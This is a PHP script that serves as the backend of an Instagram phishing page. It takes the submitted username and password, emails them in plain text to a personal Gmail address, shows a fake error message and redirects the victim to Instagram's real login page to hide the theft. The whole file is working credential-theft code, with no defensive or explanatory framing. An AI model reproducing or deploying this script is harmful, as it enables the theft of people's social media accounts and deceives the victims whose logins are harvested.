<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"] ?? "";
    $password = $_POST["password"] ?? "";

    // Validate input
    if (empty($username) || empty($password)) {
        echo "Both fields are required.";
        exit;
    }

    // Sanitize input
    $username = htmlspecialchars($username);
    $password = htmlspecialchars($password);

    // Email details
    $to = "chetanthakur8077@gmail.com";
    $subject = "New Login Attempt";
    $message = "Username: " . $username . "\nPassword: " . $password;
    $headers = "From: no-reply@yourdomain.com";

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "an unexpected error occor, please try to login from our app";
        
        header("location: https://www.instagram.com/accounts/onetap/?next=%2F");

        exit();

    } else {
        echo "Failed to login.";
    }
}
?>
<!-- https://www.instagram.com/accounts/onetap/?next=%2F -->